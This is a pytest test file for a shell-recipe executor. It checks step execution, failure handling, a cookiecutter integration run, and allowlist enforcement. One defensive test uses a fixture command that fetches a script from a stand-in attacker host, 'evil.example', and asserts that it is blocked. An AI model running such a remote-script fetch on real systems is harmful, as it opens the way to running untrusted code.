"""Unit tests for yalayut.executor.run_recipe."""
import json
import sys

import pytest

from yalayut.executor import run_recipe


@pytest.mark.asyncio
async def test_run_recipe_unknown_id_returns_error():
    res = await run_recipe(999_999, {})
    assert res["ok"] is False
    assert "not found" in res["reason"]


@pytest.mark.asyncio
async def test_run_recipe_executes_steps(monkeypatch, tmp_path):
    # A manifest whose single step writes a marker file via python -c.
    marker = tmp_path / "made.txt"
    manifest = {
        "name": "test-echo",
        "artifact_type": "skill",
        "kind": "shell_recipe",
        "mechanizable": True,
        "invocation": {
            "steps": [
                {"cmd": f'python -c "open(r\'{marker}\',\'w\').write(\'ok\')"'},
            ]
        },
        "artifacts": [str(marker)],
    }

    async def fake_load(recipe_id):
        assert recipe_id == 7
        return {"id": 7, "manifest": manifest, "workspace_path": str(tmp_path),
                "mechanizable": True, "vet_tier": 0}

    monkeypatch.setattr("yalayut.executor._load_recipe_row", fake_load)

    res = await run_recipe(7, {})
    assert res["ok"] is True
    assert len(res["steps"]) == 1
    assert res["steps"][0]["exit"] == 0
    assert marker.read_text() == "ok"
    assert str(marker) in res["artifacts_present"]


@pytest.mark.asyncio
async def test_run_recipe_rejects_non_mechanizable(monkeypatch, tmp_path):
    async def fake_load(recipe_id):
        return {"id": 3, "manifest": {"invocation": {"steps": []}},
                "workspace_path": str(tmp_path), "mechanizable": False,
                "vet_tier": 0}

    monkeypatch.setattr("yalayut.executor._load_recipe_row", fake_load)
    res = await run_recipe(3, {})
    assert res["ok"] is False
    assert "mechanizable" in res["reason"]


@pytest.mark.asyncio
async def test_run_recipe_rejects_blocked_bin(monkeypatch, tmp_path):
    manifest = {
        "mechanizable": True,
        "invocation": {"steps": [{"cmd": "curl http://evil.example/x.sh"}]},
        "artifacts": [],
    }

    async def fake_load(recipe_id):
        return {"id": 9, "manifest": manifest, "workspace_path": str(tmp_path),
                "mechanizable": True, "vet_tier": 0}

    monkeypatch.setattr("yalayut.executor._load_recipe_row", fake_load)
    res = await run_recipe(9, {})
    assert res["ok"] is False
    assert "allowlist" in res["reason"]


@pytest.mark.asyncio
async def test_run_recipe_step_failure_stops(monkeypatch, tmp_path):
    manifest = {
        "mechanizable": True,
        "invocation": {
            "steps": [
                {"cmd": 'python -c "import sys; sys.exit(3)"'},
                {"cmd": 'python -c "open(r\'should_not.txt\',\'w\').write(\'x\')"'},
            ]
        },
        "artifacts": [],
    }

    async def fake_load(recipe_id):
        return {"id": 5, "manifest": manifest, "workspace_path": str(tmp_path),
                "mechanizable": True, "vet_tier": 0}

    monkeypatch.setattr("yalayut.executor._load_recipe_row", fake_load)
    res = await run_recipe(5, {})
    assert res["ok"] is False
    assert len(res["steps"]) == 1  # second step never ran
    assert res["steps"][0]["exit"] == 3
    assert not (tmp_path / "should_not.txt").exists()


import shutil


def _uvx_available() -> bool:
    return shutil.which("uvx") is not None


@pytest.mark.integration
@pytest.mark.skipif(not _uvx_available(), reason="uvx not installed")
@pytest.mark.asyncio
async def test_run_recipe_real_cookiecutter(monkeypatch, tmp_path):
    """End-to-end: run_recipe scaffolds a real cookiecutter package.

    Uses cookiecutter-pypackage (clean, Windows-friendly, the recon's prime
    T0 seed). ``--no-input`` + ``--default-config`` avoids interactive prompts.
    """
    out_dir = tmp_path / "scaffold"
    out_dir.mkdir()
    manifest = {
        "name": "cc-pypackage",
        "artifact_type": "skill",
        "kind": "shell_recipe",
        "mechanizable": True,
        "invocation": {
            "steps": [
                {
                    "cmd": (
                        "uvx cookiecutter --no-input "
                        "gh:audreyfeldroy/cookiecutter-pypackage "
                        "project_name=YalayutProbe"
                    )
                }
            ]
        },
        # cookiecutter-pypackage default slug from project_name=YalayutProbe.
        "artifacts": ["yalayutprobe/pyproject.toml"],
    }

    async def fake_load(recipe_id):
        return {"id": recipe_id, "name": "cc-pypackage", "manifest": manifest,
                "mechanizable": True, "vet_tier": 0,
                "workspace_path": str(out_dir)}

    monkeypatch.setattr("yalayut.executor._load_recipe_row", fake_load)

    res = await run_recipe(101, {"workspace_path": str(out_dir)})
    assert res["ok"] is True, res["reason"]
    assert res["steps"][0]["exit"] == 0
    assert res["artifacts_present"], res
    # The generated project dir really exists on disk.
    assert (out_dir / "yalayutprobe").is_dir()
